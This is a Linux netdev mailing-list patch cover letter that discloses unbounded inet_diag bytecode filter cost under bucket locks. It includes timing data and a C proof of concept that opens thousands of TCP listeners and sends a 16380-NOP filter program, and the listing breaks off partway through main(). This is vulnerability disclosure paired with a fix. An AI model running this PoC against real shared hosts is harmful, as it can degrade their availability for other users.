Received: from mail-pz2-f12.google.com (mail-pz2-f12.google.com [74.125.228.12])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2320A47D920
	for <netdev@vger.kernel.org>; Mon,  7 Sep 2026 13:53:18 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.12
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788789201; cv=none; b=pCe5MO29tkaVNn2XO79DqP4f6PAWvRoL7DW0D0whCThVoyBMeNn6PNT2F3DzQwAFRZSN2LEOf/icJKtpFO2v9zp9mEoS/rbrE8Os0raPZVip+omqTcQ2zgwkp3lDL2kRjOB25w7vmTufEbKxFKaEKQQeOYuB/lge6vV4kEId8zY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788789201; c=relaxed/simple;
	bh=Rzn/5vJMfKvvM13MjiFk66X+fr3EIrKdKo+ffjrUvSs=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UzW2/8bXUpzadYlCwACQZLQkSKRwKw4AgVgX7T46/C2O2bMd9LWhY8NHmYFF9jfJsATWTDg3HoBqdO8lTw1iGMj1JQxBbZ2knWeEY0yN6IeYbpEsvcV6xUJdx5sT6MbY+bWAB0O5QBE/TezsfSIcYzT6TJR+c4p5P6IBewnbWe8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=ZnnxBY8Y; arc=none smtp.client-ip=74.125.228.12
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="ZnnxBY8Y"
Received: by mail-pz2-f12.google.com with SMTP id 41be03b00d2f7-cc1ceb47d55so35808a12.1
        for <netdev@vger.kernel.org>; Mon, 07 Sep 2026 06:53:18 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788789198; x=1789393998; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=ZaGp96E0X/gjK4hHuYLqorzKzNf+jc2/3U9eg6R4q6k=;
        b=ZnnxBY8YfQyea7JIQtSqx4w2Ztfv1ZHlMg7W4Qtdrk3vWdGlPQibHvkJokKImxMlCH
         ozTJ4djvCBbYRYjzJxAnIait2rzB/BUEME9h2fmGaJ1tMd/Nc/vATjUtopsXaHJ4Vvu2
         AS7zS4e+KFqmt50ifxagfr83SWZtfquIhAoAmMXzmj5gW/ZOtS88SaZvsTKP1S53eQZ9
         eQ2jpJljIMxtVdQz4vA3PSxTWR0Uhl39syv4/snK5biR580w40mvBx3mIybMSYSHUIkk
         XeiKrDE4Z8pcQxGyQ54Y/eLz7irFvY4eMUMqwNJHVVvG9b/ZuUDq1pMAhtDkBI1YC9dO
         hx8A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788789198; x=1789393998;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=ZaGp96E0X/gjK4hHuYLqorzKzNf+jc2/3U9eg6R4q6k=;
        b=NXUPpszzFW2LIJ9HECO4FBP94IwlsZb+vQ9VFJpiibAqiETiVq5Ugu+XqsBKPK8M68
         98RBTIzmrKPGSriZwOkDjicDIiZGfe/OxxiBgc8jUaUr+Wk/nYQWeciJm1HvM90WYPos
         20vArM/gEu2J2mpFs4ZgbQxBVJBUvqg58GBSHAxVTVKhWO48VqyN5SZJJf4bMxQIZeS8
         4Qt9Ji8+06MzHgTRunUlxfmAs4JaAdtJB385LobyqZ5M2x3hrjgNF4VRi/9ogKOglmip
         XtMibZbyjXlMWfX+wKdZpCrjHT999i0gWNQGM4PbTCY3mToHpE3Ou03wLFPk1fMaARWv
         Hjbg==
X-Gm-Message-State: AFuF++kO6VFn8yqN/aMMB2hDCrTwRaYEMq2komAX+dRuDjUpxNMkAHEv
	RR5XxVSj63pkKmWboFzh8fg3yjsDl3nUkhiB/64ZYzk1F0fhcZb48tfoQlTi4Vf/aqGTgxfxn6a
	HuizmEpzh
X-Gm-Gg: AYBFou2BkJyeAAxz1Y3S5ifrxnlozv6sIPRB7KLSeZOlv6g7US4MjqqzU29B4DYGx2p
	rdkNUTcWl6imoy6AbkyiwlO+hPQfgGQ8cYkdHK8yqYegd+WcsfqFcSyqkeD0SsE2jU1WGdRC7e6
	akCz78yqSVZPybMgBl6TVRLW+fiwwQ+LgTv6rPD1OAufrgiMEtsrFp1D60Hq9Ji4GtFwOxV5HHd
	/ydV8FwOgfesgKZHadx+ej7uhZkEHY1OBQ4dAkBo69THt5fA8Q0Awc/NOB+6yhykX6p9S24KhIJ
	lm/CujqUIZNn4TzDONaIVIbfEF6ZO9ltI4P724zehRnebZ4wnYwOLlHvd+pWV3f5OfgjWG0rwRF
	rlTgv//NmwOCTLW6fXOc+D5lprWPg5cerZWidxvebDdEkAf6CN82XD/cL0bvXZ7jtXXzXfpSlqI
	cVIepGSM83nui825/ymEgig8EbxzQ6qBUKDYYVXvCj/HtOxqRD8+XtvgQlHFdbJYIjD+Eo/WoVS
	nIlr/dApeUJzDUCMqY=
X-Received: by 2002:a17:90b:4ad1:b0:38f:657:6823 with SMTP id 98e67ed59e1d1-39b8bd997f7mr855668a91.8.1788789197992;
        Mon, 07 Sep 2026 06:53:17 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39b260fdc1dsm21282204a91.7.2026.09.07.06.53.14
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 07 Sep 2026 06:53:17 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: "David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Kuniyuki Iwashima <kuniyu@google.com>,
	David Ahern <dsahern@kernel.org>,
	Kees Cook <kees@kernel.org>,
	linux-kernel@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net 0/1] inet_diag: cap bytecode filter complexity
Date: Mon,  7 Sep 2026 13:53:10 +0000
Message-ID: <cover.1788775605.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,=0D
=0D
We found and validated an issue in net/ipv4/inet_diag.c. The numbers=0D
below were taken as root in QEMU, not under unshare -Urn.=0D
=0D
A no-bytecode TCP listener dump still completes after the cap. A 64-op=0D
program is still accepted. The 16380-NOP request is rejected with=0D
EINVAL.=0D
=0D
We will provide detailed information about the bug=0D
in this email, along with a PoC to trigger it.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
inet_diag dumps run request-supplied INET_DIAG_REQ_BYTECODE programs=0D
through inet_diag_bc_sk() while walking TCP, UDP and MPTCP hash buckets=0D
under their bucket locks. inet_diag_bc_audit() currently accepts an=0D
arbitrarily long program, so the per-socket filter cost is not bounded=0D
by the auditor.=0D
=0D
This fact is already present at the git epoch: tcpdiag_bc_audit() had=0D
no op cap, and tcpdiag_dump() ran the bytecode while holding the=0D
listener and ehash locks. Later inet_diag extraction, including=0D
8d07d1518a07, only moved that code. Fixes therefore points to=0D
1da177e4c3f4.=0D
=0D
ss(8) filters only need a handful of compare/host/mark operations.=0D
This patch rejects programs with more than 64 ops in=0D
inet_diag_bc_audit(), which is the shared entry point for TCP, UDP=0D
and MPTCP dumps. 64 is a policy cap above a normal ss(8) filter,=0D
not a lock-hold budget.=0D
=0D
The runtime logs are TCP listener dumps only. udp_diag_dump() and=0D
mptcp_diag_dump_listeners() call the same inet_diag_bc_sk() helper=0D
under their own bucket locks, so the auditor cap applies there too;=0D
we did not rerun those dumps.=0D
=0D
On the unfixed kernel 7.3.0-rc1-00293-g38b6be101006, KVM/host CPU,=0D
watchdog_thresh=3D10, one SO_REUSEPORT group of 4096 TCP listeners,=0D
guest root, ulimit -n 200000:=0D
=0D
    ./poc --listen --groups 1 --count 4096 --nops 16380 --compare=0D
    no bytecode:     1.429 ms=0D
    16380 NOPs:    116.242 ms=0D
=0D
dmesg after that dump did not show a soft lockup. These are PoC dump=0D
wall times, not spin_lock timestamps. We did not record lock-hold=0D
duration.=0D
=0D
On this kernel the TCP listener walk calls inet_diag_bc_sk() and=0D
inet_sk_diag_fill() under ilb->lock.=0D
=0D
ftrace kprobes on the same unfixed kernel:=0D
=0D
    ./poc --listen --groups 1 --count 8 --nops 16380 --cpu 0=0D
=0D
shows inet_diag_bc_sk() called from tcp_diag_dump(), with kretprobe=0D
returning into tcp_diag_dump+0x16d.=0D
=0D
    ./poc --listen --groups 1 --count 4096 --nops 16380 --cpu 0 --compare=0D
=0D
with those probes attached entered inet_diag_bc_sk() 8212 times=0D
across the baseline dump and the NOP dump, and summed to 129.493 ms=0D
inside that function. Probe overhead is included; the same attack=0D
without probes was 116.242 ms.=0D
=0D
On the patched kernel 7.3.0-rc1-00294-g03a6504e40de, same 4096-listener=0D
compare: the no-bytecode baseline dump succeeded (wall_ms=3D1.479), then=0D
the 16380-NOP request returned EINVAL.=0D
=0D
    ./poc --listen --groups 1 --count 4096 --nops 63=0D
=0D
still succeeds (wall_ms=3D0.841). That program is 63 INET_DIAG_BC_NOP=0D
ops plus a trailing INET_DIAG_BC_D_EQ, which the auditor counts as=0D
64 ops, i.e. the cap.=0D
=0D
The tested patched bzImage reports 03a6504e40de. The commit in this=0D
series is a later message/trailer amend of that same tree.=0D
=0D
A previous dump-cursor rewrite for TCP/MPTCP was dropped.=0D
=0D
Reproducer:=0D
=0D
    gcc -O2 -static -o poc poc.c=0D
    ulimit -n 200000=0D
    ./poc --listen --groups 1 --count 4096 --nops 16380 --compare=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment, KVM,=0D
cpu=3Dhost. The timing log used guest root, not unshare -Urn.=0D
=0D
This is not a packet-sequence or protocol-state reproducer. The trigger=0D
depends on creating many sockets and issuing NETLINK_SOCK_DIAG requests,=0D
which packetdrill cannot express, so the PoC uses sockets and Netlink=0D
directly.=0D
=0D
------BEGIN poc.c------=0D
#define _GNU_SOURCE=0D
=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <linux/inet_diag.h>=0D
#include <linux/netlink.h>=0D
#include <linux/sock_diag.h>=0D
#include <linux/tcp.h>=0D
#include <sched.h>=0D
#include <stdbool.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/resource.h>=0D
#include <sys/socket.h>=0D
#include <sys/time.h>=0D
#include <time.h>=0D
#include <unistd.h>=0D
=0D
#ifndef SOL_TCP=0D
#define SOL_TCP 6=0D
#endif=0D
=0D
#ifndef TCP_LISTEN=0D
#define TCP_LISTEN 10=0D
#endif=0D
=0D
#define TCPF_LISTEN (1U << TCP_LISTEN)=0D
=0D
#ifndef TCP_BOUND_INACTIVE=0D
#define TCP_BOUND_INACTIVE 13=0D
#endif=0D
#ifndef TCPF_BOUND_INACTIVE=0D
#define TCPF_BOUND_INACTIVE (1U << TCP_BOUND_INACTIVE)=0D
#endif=0D
=0D
#define DEFAULT_SOCKETS 32768U=0D
#define DEFAULT_NOPS 16380U=0D
#define DEFAULT_REPEAT 1U=0D
#define DEFAULT_GROUPS 4U=0D
#define DEFAULT_STRIDE 2048U=0D
#define DEFAULT_BASE_PORT 10000=0D
#define MAX_NOPS 16380U=0D
#define RECV_BUF_SIZE (1U << 20)=0D
=0D
struct options {=0D
	unsigned int sockets;=0D
	unsigned int nops;=0D
	unsigned int repeat;=0D
	unsigned int groups;=0D
	unsigned int stride;=0D
	unsigned int cpu;=0D
	bool cpu_set;=0D
	bool compare;=0D
	bool attack;=0D
	bool listen_mode;=0D
	int port;=0D
};=0D
=0D
static void usage(const char *prog)=0D
{=0D
	fprintf(stderr,=0D
		"Usage: %s [--count N] [--nops N] [--repeat N] [--port P] [--cpu N]\n"=0D
		"          [--groups N] [--stride N] [--compare] [--no-attack]\n"=0D
		"          [--listen | --bound]\n"=0D
		"Defaults: --count %u --nops %u --repeat %u\n",=0D
		prog, DEFAULT_SOCKETS, DEFAULT_NOPS, DEFAULT_REPEAT);=0D
}=0D
=0D
static long long timespec_delta_ns(const struct timespec *start,=0D
				       const struct timespec *end)=0D
{=0D
	return (end->tv_sec - start->tv_sec) * 1000000000LL +=0D
	       (end->tv_nsec - start->tv_nsec);=0D
}=0D
=0D
static int raise_nofile_limit(rlim_t needed)=0D
{=0D
	struct rlimit lim;=0D
=0D
	if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {=0D
		perror("getrlimit(RLIMIT_NOFILE)");=0D
		return -1;=0D
	}=0D
=0D
	if (lim.rlim_cur >=3D needed)=0D
		return 0;=0D
=0D
	if (lim.rlim_max < needed)=0D
		needed =3D lim.rlim_max;=0D
=0D
	lim.rlim_cur =3D needed;=0D
	if (setrlimit(RLIMIT_NOFILE, &lim) < 0) {=0D
		perror("setrlimit(RLIMIT_NOFILE)");=0D
		return -1;=0D
	}=0D
=0D
	if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {=0D
		perror("getrlimit(RLIMIT_NOFILE)");=0D
		return -1;=0D
	}=0D
=0D
	if (lim.rlim_cur < needed) {=0D
		fprintf(stderr, "RLIMIT_NOFILE stayed at %llu, need %llu\n",=0D
			(unsigned long long)lim.rlim_cur,=0D
			(unsigned long long)needed);=0D
		return -1;=0D
	}=0D
=0D
	return 0;=0D
}=0D
=0D
static int pin_to_cpu(unsigned int cpu)=0D
{=0D
	cpu_set_t set;=0D
=0D
	CPU_ZERO(&set);=0D
	CPU_SET(cpu, &set);=0D
	if (sched_setaffinity(0, sizeof(set), &set) < 0) {=0D
		perror("sched_setaffinity");=0D
		return -1;=0D
	}=0D
=0D
	return 0;=0D
}=0D
=0D
static int create_socket_in_bucket(bool listen_mode, int port, int *bound_p=
ort)=0D
{=0D
	struct sockaddr_in addr =3D {=0D
		.sin_family =3D AF_INET,=0D
		.sin_addr.s_addr =3D htonl(INADDR_ANY),=0D
	};=0D
	socklen_t addrlen =3D sizeof(addr);=0D
	int one =3D 1;=0D
	int fd;=0D
=0D
	fd =3D socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);=0D
	if (fd < 0) {=0D
		perror("socket(AF_INET, SOCK_STREAM)");=0D
		return -1;=0D
	}=0D
=0D
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) {=0D
		perror("setsockopt(SO_REUSEADDR)");=0D
		goto err;=0D
	}=0D
=0D
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) < 0) {=0D
		perror("setsockopt(SO_REUSEPORT)");=0D
		goto err;=0D
	}=0D
=0D
	addr.sin_port =3D htons(port);=0D
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {=0D
		perror("bind");=0D
		goto err;=0D
	}=0D
=0D
	if (getsockname(fd, (struct sockaddr *)&addr, &addrlen) < 0) {=0D
		perror("getsockname");=0D
		goto err;=0D
	}=0D
=0D
	if (listen_mode) {=0D
		if (listen(fd, 0) < 0) {=0D
			perror("listen");=0D
			goto err;=0D
		}=0D
	}=0D
=0D
	*bound_port =3D ntohs(addr.sin_port);=0D
	return fd;=0D
=0D
err:=0D
	close(fd);=0D
	return -1;=0D
}=0D
=0D
static int setup_sockets(bool listen_mode, unsigned int groups,=0D
			 unsigned int count_per_group, unsigned int stride,=0D
			 int requested_port, int **fds_out, int *port_out)=0D
{=0D
	int *fds;=0D
	unsigned int g, i;=0D
	unsigned int total =3D groups * count_per_group;=0D
	int base_port =3D requested_port ? requested_port : DEFAULT_BASE_PORT;=0D
=0D
	fds =3D calloc(total, sizeof(*fds));=0D
	if (!fds) {=0D
		perror("calloc(socket fds)");=0D
		return -1;=0D
	}=0D
=0D
	for (g =3D 0; g < groups; g++) {=0D
		int port =3D base_port + (int)(g * stride);=0D
=0D
		if (port <=3D 0 || port > 65535) {=0D
			fprintf(stderr, "port overflow for group %u (base=3D%d stride=3D%u)\n",=
=0D
				g, base_port, stride);=0D
			goto err;=0D
		}=0D
=0D
		for (i =3D 0; i < count_per_group; i++) {=0D
			unsigned int idx =3D g * count_per_group + i;=0D
			int bound_port =3D port;=0D
			int fd =3D create_socket_in_bucket(listen_mode, bound_port,=0D
							 &bound_port);=0D
=0D
			if (fd < 0) {=0D
				fprintf(stderr,=0D
					"socket setup failed at group %u index %u (port %d)\n",=0D
					g, i, port);=0D
				goto err;=0D
			}=0D
=0D
			fds[idx] =3D fd;=0D
			if ((idx + 1) % 4096U =3D=3D 0 || idx + 1 =3D=3D total) {=0D
				printf("sockets_ready=3D%u group=3D%u port=3D%d mode=3D%s\n",=0D
				       idx + 1, g + 1, port,=0D
				       listen_mode ? "listen" : "bound");=0D
			}=0D
		}=0D
	}=0D
=0D
	*fds_out =3D fds;=0D
	*port_out =3D base_port;=0D
	return 0;=0D
=0D
err:=0D
	for (i =3D 0; i < total; i++) {=0D
		if (fds[i] > 0)=0D
			close(fds[i]);=0D
	}=0D
	free(fds);=0D
	return -1;=0D
}=0D
=0D
static void teardown_sockets(int *fds, unsigned int count)=0D
{=0D
	unsigned int i;=0D
=0D
	if (!fds)=0D
		return;=0D
=0D
	for (i =3D 0; i < count; i++) {=0D
		if (fds[i] >=3D 0)=0D
			close(fds[i]);=0D
	}=0D
	free(fds);=0D
}=0D
=0D
static size_t build_request(void *buf, bool listen_mode, bool with_attack,=
=0D
			    unsigned int nops)=0D
{=0D
	size_t msg_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2));=0D
	struct nlmsghdr *nlh =3D buf;=0D
	struct inet_diag_req_v2 *req;=0D
=0D
	memset(buf, 0, msg_len);=0D
	nlh->nlmsg_len =3D msg_len;=0D
	nlh->nlmsg_type =3D SOCK_DIAG_BY_FAMILY;=0D
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_DUMP;=0D
	nlh->nlmsg_seq =3D 1;=0D
=0D
	req =3D NLMSG_DATA(nlh);=0D
	req->sdiag_family =3D AF_INET;=0D
	req->sdiag_protocol =3D IPPROTO_TCP;=0D
	req->idiag_states =3D listen_mode ? TCPF_LISTEN : TCPF_BOUND_INACTIVE;=0D
	req->id.idiag_cookie[0] =3D INET_DIAG_NOCOOKIE;=0D
	req->id.idiag_cookie[1] =3D INET_DIAG_NOCOOKIE;=0D
=0D
	if (with_attack) {=0D
		size_t payload_len =3D ((size_t)nops + 2U) *=0D
				     sizeof(struct inet_diag_bc_op);=0D
		size_t attr_len =3D NLA_HDRLEN + payload_len;=0D
		struct nlattr *nla =3D (struct nlattr *)((char *)buf + msg_len);=0D
		struct inet_diag_bc_op *ops;=0D
		unsigned int i;=0D
=0D
		memset(nla, 0, NLA_ALIGN(attr_len));=0D
		nla->nla_type =3D INET_DIAG_REQ_BYTECODE;=0D
		nla->nla_len =3D attr_len;=0D
		ops =3D (struct inet_diag_bc_op *)((char *)nla + NLA_HDRLEN);=0D
=0D
		for (i =3D 0; i < nops; i++) {=0D
			ops[i].code =3D INET_DIAG_BC_NOP;=0D
			ops[i].yes =3D sizeof(struct inet_diag_bc_op);=0D
			ops[i].no =3D 0;=0D
		}=0D
=0D
		ops[nops].code =3D INET_DIAG_BC_D_EQ;=0D
		ops[nops].yes =3D 2U * sizeof(struct inet_diag_bc_op);=0D
		ops[nops].no =3D 3U * sizeof(struct inet_diag_bc_op);=0D
=0D
		ops[nops + 1].code =3D 0;=0D
		ops[nops + 1].yes =3D 0;=0D
		ops[nops + 1].no =3D 1;=0D
=0D
		msg_len +=3D NLA_ALIGN(attr_len);=0D
		nlh->nlmsg_len =3D msg_len;=0D
	}=0D
=0D
	return msg_len;=0D
}=0D
=0D
static int recv_until_done(int fd)=0D
{=0D
	char *buf;=0D
	int ret =3D 0;=0D
=0D
	buf =3D malloc(RECV_BUF_SIZE);=0D
	if (!buf) {=0D
		perror("malloc(recv buf)");=0D
		return -1;=0D
	}=0D
=0D
	for (;;) {=0D
		ssize_t received =3D recv(fd, buf, RECV_BUF_SIZE, 0);=0D
		struct nlmsghdr *nlh;=0D
		int remaining;=0D
=0D
		if (received < 0) {=0D
			perror("recv");=0D
			ret =3D -1;=0D
			break;=0D
		}=0D
=0D
		if (received =3D=3D 0) {=0D
			fprintf(stderr, "recv: unexpected EOF\n");=0D
			ret =3D -1;=0D
			break;=0D
		}=0D
=0D
		remaining =3D (int)received;=0D
		for (nlh =3D (struct nlmsghdr *)buf; NLMSG_OK(nlh, remaining);=0D
		     nlh =3D NLMSG_NEXT(nlh, remaining)) {=0D
			if (nlh->nlmsg_type =3D=3D NLMSG_DONE)=0D
				goto out;=0D
=0D
			if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) {=0D
				const struct nlmsgerr *err =3D NLMSG_DATA(nlh);=0D
=0D
				if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(*err))) {=0D
					fprintf(stderr, "short NLMSG_ERROR\n");=0D
				} else if (err->error) {=0D
					errno =3D -err->error;=0D
					perror("netlink");=0D
				} else {=0D
					fprintf(stderr, "unexpected ACK\n");=0D
				}=0D
				ret =3D -1;=0D
				goto out;=0D
			}=0D
		}=0D
	}=0D
=0D
out:=0D
	free(buf);=0D
	return ret;=0D
}=0D
=0D
static int run_dump(bool listen_mode, bool with_attack, unsigned int nops,=
=0D
		    double *wall_ms)=0D
{=0D
	size_t request_len;=0D
	size_t attr_space =3D with_attack ?=0D
			    NLA_ALIGN(NLA_HDRLEN +=0D
				      ((size_t)nops + 2U) *=0D
				      sizeof(struct inet_diag_bc_op)) : 0;=0D
	size_t alloc_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2)) +=0D
			   attr_space;=0D
	struct sockaddr_nl local =3D {=0D
		.nl_family =3D AF_NETLINK,=0D
	};=0D
	struct sockaddr_nl kernel =3D {=0D
		.nl_family =3D AF_NETLINK,=0D
	};=0D
	struct timeval timeout =3D {=0D
		.tv_sec =3D 60,=0D
		.tv_usec =3D 0,=0D
	};=0D
	struct iovec iov;=0D
	struct msghdr msg =3D {=0D
		.msg_name =3D &kernel,=0D
		.msg_namelen =3D sizeof(kernel),=0D
		.msg_iov =3D &iov,=0D
		.msg_iovlen =3D 1,=0D
	};=0D
	struct timespec start_ts;=0D
	struct timespec end_ts;=0D
	void *request;=0D
	int fd;=0D
	int ret =3D -1;=0D
=0D
	request =3D malloc(alloc_len);=0D
	if (!request) {=0D
		perror("malloc(request)");=0D
		return -1;=0D
	}=0D
=0D
	request_len =3D build_request(request, listen_mode, with_attack, nops);=0D
=0D
	fd =3D socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_SOCK_DIAG);=0D
	if (fd < 0) {=0D
		perror("socket(AF_NETLINK)");=0D
		free(request);=0D
		return -1;=0D
	}=0D
=0D
	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0=
) {=0D
		perror("setsockopt(SO_RCVTIMEO)");=0D
		goto out;=0D
	}=0D
=0D
	if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {=0D
		perror("bind(netlink)");=0D
		goto out;=0D
	}=0D
=0D
	iov.iov_base =3D request;=0D
	iov.iov_len =3D request_len;=0D
=0D
	if (clock_gettime(CLOCK_MONOTONIC_RAW, &start_ts) < 0) {=0D
		perror("clock_gettime(start)");=0D
		goto out;=0D
	}=0D
=0D
	if (sendmsg(fd, &msg, 0) < 0) {=0D
		perror("sendmsg");=0D
		goto out;=0D
	}=0D
=0D
	if (recv_until_done(fd) < 0)=0D
		goto out;=0D
=0D
	if (clock_gettime(CLOCK_MONOTONIC_RAW, &end_ts) < 0) {=0D
		perror("clock_gettime(end)");=0D
		goto out;=0D
	}=0D
=0D
	*wall_ms =3D (double)timespec_delta_ns(&start_ts, &end_ts) / 1000000.0;=0D
	ret =3D 0;=0D
=0D
out:=0D
	close(fd);=0D
	free(request);=0D
	return ret;=0D
}=0D
=0D
static int parse_u32(const char *arg, unsigned int *value)=0D
{=0D
	char *end =3D NULL;=0D
	unsigned long parsed;=0D
=0D
	parsed =3D strtoul(arg, &end, 0);=0D
	if (!end || *end || parsed > UINT32_MAX)=0D
		return -1;=0D
=0D
	*value =3D (unsigned int)parsed;=0D
	return 0;=0D
}=0D
=0D
static int parse_port(const char *arg, int *port)=0D
{=0D
	unsigned int value;=0D
=0D
	if (parse_u32(arg, &value) < 0 || value > 65535U)=0D
		return -1;=0D
=0D
	*port =3D (int)value;=0D
	return 0;=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	struct options opts =3D {=0D
		.sockets =3D DEFAULT_SOCKETS,=0D
		.nops =3D DEFAULT_NOPS,=0D
		.repeat =3D DEFAULT_REPEAT,=0D
		.groups =3D DEFAULT_GROUPS,=0D
		.stride =3D DEFAULT_STRIDE,=0D
		.cpu =3D 0,=0D
		.cpu_set =3D false,=0D
		.compare =3D false,=0D
		.attack =3D true,=0D
		.listen_mode =3D true,=0D
		.port =3D 0,=0D
	};=0D
	int *fds =3D NULL;=0D
	int port =3D 0;=0D
	unsigned int i;=0D
=0D
	for (i =3D 1; i < (unsigned int)argc; i++) {=0D
		if (strcmp(argv[i], "--count") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.sockets) < 0 ||=0D
			    opts.sockets =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--nops") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.nops) < 0 ||=0D
			    opts.nops > MAX_NOPS) {=0D
				fprintf(stderr, "--nops must be in range [0, %u]\n",=0D
					MAX_NOPS);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--repeat") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.repeat) < 0 ||=0D
			    opts.repeat =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--groups") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.groups) < 0 ||=0D
			    opts.groups =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--stride") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.stride) < 0 ||=0D
			    opts.stride =3D=3D 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--port") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_port(argv[++i], &opts.port) < 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
		} else if (strcmp(argv[i], "--cpu") =3D=3D 0) {=0D
			if (i + 1 >=3D (unsigned int)argc ||=0D
			    parse_u32(argv[++i], &opts.cpu) < 0) {=0D
				usage(argv[0]);=0D
				return 1;=0D
			}=0D
			opts.cpu_set =3D true;=0D
		} else if (strcmp(argv[i], "--compare") =3D=3D 0) {=0D
			opts.compare =3D true;=0D
		} else if (strcmp(argv[i], "--no-attack") =3D=3D 0) {=0D
			opts.attack =3D false;=0D
		} else if (strcmp(argv[i], "--listen") =3D=3D 0) {=0D
			opts.listen_mode =3D true;=0D
		} else if (strcmp(argv[i], "--bound") =3D=3D 0) {=0D
			opts.listen_mode =3D false;=0D
		} else {=0D
			usage(argv[0]);=0D
			return 1;=0D
		}=0D
	}=0D
=0D
	if (opts.groups > UINT32_MAX / opts.sockets) {=0D
		fprintf(stderr, "socket count overflow\n");=0D
		return 1;=0D
	}=0D
=0D
	if (raise_nofile_limit((rlim_t)opts.sockets * opts.groups + 64U) < 0)=0D
		return 1;=0D
=0D
	if (opts.cpu_set && pin_to_cpu(opts.cpu) < 0)=0D
		return 1;=0D
=0D
	if (setup_sockets(opts.listen_mode, opts.groups, opts.sockets,=0D
			  opts.stride, opts.port, &fds, &port) < 0)=0D
		return 1;=0D
=0D
	printf("setup_complete groups=3D%u sockets_per_group=3D%u total_sockets=3D=
%u base_port=3D%d stride=3D%u mode=3D%s nops=3D%u repeat=3D%u compare=3D%s =
attack=3D%s\n",=0D
	       opts.groups, opts.sockets, opts.groups * opts.sockets,=0D
	       port, opts.stride, opts.listen_mode ? "listen" : "bound",=0D
